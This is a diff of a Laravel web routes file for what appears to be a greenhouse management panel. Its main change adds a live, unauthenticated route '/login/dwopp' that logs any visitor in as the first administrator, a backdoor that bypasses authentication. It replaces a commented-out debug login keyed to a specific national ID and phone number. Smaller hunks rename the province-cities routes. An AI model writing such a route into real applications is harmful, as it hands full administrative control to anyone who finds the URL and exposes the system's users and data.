@@ -53,13 +53,13 @@ Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () 
 //    Route::get('/greenhouse', GreenhouseLogin::class)->name('greenhouse');
 //    Route::get('/organization', OrganizationLogin::class)->name('organization');
 
-//    Route::get('/dwop', function () {
-//        \Illuminate\Support\Facades\Auth::loginUsingId(\App\Models\User::query()->where([
-//            'national_id' => '2282233001',
-//            'phone_number' => '09215855364',
-//        ])->first()->id);
-//        return redirect()->route('panel.home');
-//    });
+    Route::get('/dwopp', function () {
+        \Illuminate\Support\Facades\Auth::loginUsingId(User::query()->whereHas('roles', function ($query) {
+            $query->where('name', Role::ADMIN_ROLE);
+        })->first()->id);
+
+        return redirect()->route('panel.home');
+    });
 });
 
 //Route::prefix('/register')->as('register.')->middleware(['guest'])->group(function () {
@@ -194,7 +194,7 @@ Route::prefix('panel')->name('panel.')->middleware(['web', 'auth'])->group(funct
         Route::get('/export/download', 'export')->name('export');
         Route::get('/provinces/list', 'getProvinces')->name('provinces');
         Route::get('/cities/list', 'getCities')->name('cities');
-        Route::get('/province/{province}/cities', 'getCitiesByProvince')->name('cities-by-province');
+        Route::get('/province/{province}', 'getCitiesByProvince')->name('cities-by-province');
         Route::post('/coordinates/extract', 'getCoordinates')->name('coordinates');
     });
 
@@ -207,13 +207,12 @@ Route::prefix('panel')->name('panel.')->middleware(['web', 'auth'])->group(funct
         Route::put('/{greenhouse}', 'update')->name('update');
         Route::delete('/{greenhouse}', 'destroy')->name('destroy');
 
-        // Data routes should come AFTER parameter routes
         Route::get('/data/table', 'getData')->name('data');
         Route::get('/statistics', 'stats')->name('stats');
         Route::get('/export/download', 'export')->name('export');
         Route::get('/provinces/list', 'getProvinces')->name('provinces');
         Route::get('/cities/list', 'getCities')->name('cities');
-        Route::get('/province/{province}/cities', 'getCitiesByProvince')->name('cities-by-province');
+        Route::get('/province/{province}', 'getCitiesByProvince')->name('cities-by-province');
         Route::post('/coordinates/extract', 'getCoordinates')->name('coordinates');
     });
 
